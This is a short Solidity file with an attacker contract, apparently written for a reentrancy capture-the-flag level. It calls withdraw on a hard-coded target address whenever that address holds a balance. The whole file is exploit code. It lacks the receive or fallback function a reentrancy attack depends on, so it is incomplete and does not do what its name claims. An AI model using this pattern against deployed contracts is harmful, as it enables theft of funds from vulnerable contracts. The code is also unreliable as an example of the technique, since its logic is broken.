// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

interface IReentrance {
    function balances(address) external view returns (uint);
    function withdraw(uint) external;
}

contract AttackReentrance {
    address private reentranceAddress = 0x0F72a09F5efC75CBE61d9563ba8e0B617d1CE3bC;

    function attack(uint _amount) public payable {
        if (address(reentranceAddress).balance != 0) {
            IReentrance(reentranceAddress).withdraw(_amount);
        }
    }
}